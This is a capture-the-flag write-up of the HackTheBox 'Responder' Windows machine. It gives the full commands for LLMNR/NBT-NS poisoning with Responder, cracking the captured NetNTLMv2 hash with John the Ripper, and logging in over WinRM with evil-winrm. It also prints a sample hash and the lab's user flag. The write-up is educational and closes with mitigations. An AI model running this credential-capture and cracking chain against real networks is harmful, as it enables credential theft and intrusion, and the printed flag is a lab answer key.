# Responder - HackTheBox Writeup

| Field | Details |
|-------|---------|
| Name | Responder |
| OS | Windows |
| Difficulty | Very Easy |
| Category | Machine |
| Points | N/A |
| Status | Pwned |
| Date | 2026-03-21 |

---

## Table of Contents

1. [Summary](#summary)
2. [Reconnaissance](#reconnaissance)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Post-Exploitation / Privilege Escalation](#post-exploitation--privilege-escalation)
6. [Flags](#flags)
7. [Key Takeaways](#key-takeaways)
8. [References](#references)

---

## Summary

Responder demonstrates an internal network credential attack path using LLMNR/NBT-NS poisoning. NetNTLMv2 credentials were captured with Responder, cracked offline, and reused for remote administration via WinRM. This led to interactive access and user flag retrieval.

---

## Reconnaissance

### Port Scan

```bash
nmap -sC -sV TARGET_IP
```

**Open Ports:**

| Port | Service | Version |
|------|---------|---------|
| 80 | HTTP | Apache 2.4.52 (Win64), PHP 8.1.1 |
| 5985 | WinRM | Microsoft HTTPAPI httpd 2.0 |

The exposed WinRM service indicated that valid credentials could likely provide remote shell access.

---

## Enumeration

Responder was started to listen for name resolution broadcasts and poison responses.

```bash
sudo responder -I tun0
```

A NetNTLMv2 hash was captured from an authentication attempt.

Example capture:

```text
Administrator::RESPONDER:ebaf4a3c0350caf7:DAC7358725FCDDE9F890C55533BA46F9:...
```

---

## Exploitation

### Vulnerability

**Category:** LLMNR / NBT-NS Poisoning with Weak Credential Hygiene

**Description:**
Insecure fallback name resolution enabled credential interception, and weak credentials allowed offline cracking.

### Proof of Concept

Crack captured hash:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Use recovered credentials for WinRM access:

```bash
evil-winrm -i TARGET_IP -u Administrator -p PASSWORD
```

---

## Post-Exploitation / Privilege Escalation

Once authenticated over WinRM, user directories were reviewed and the flag was read.

```powershell
cd C:\Users
dir
cd C:\Users\Mike\Desktop
type flag.txt
```

Observed users:

```text
Administrator
Mike
Public
```

Retrieved flag:

```text
ea81b7afddd03efaa0945333ed147fac
```

---

## Flags

| Flag | Hash |
|------|------|
| User flag | ea81b7afddd03efaa0945333ed147fac |
| Root flag | N/A |

---

## Key Takeaways

- What I learned: Name resolution poisoning can become full compromise when password policies are weak.
- Techniques used: LLMNR poisoning, NetNTLMv2 capture, offline cracking, credential reuse via WinRM.
- Tools used: Nmap, Responder, John the Ripper, Evil-WinRM.
- Mitigations: Disable LLMNR/NBT-NS, enforce strong passwords, enable SMB signing, and monitor abnormal responder-like traffic.

---

## References

- https://app.hackthebox.com
- https://owasp.org/www-project-top-ten/
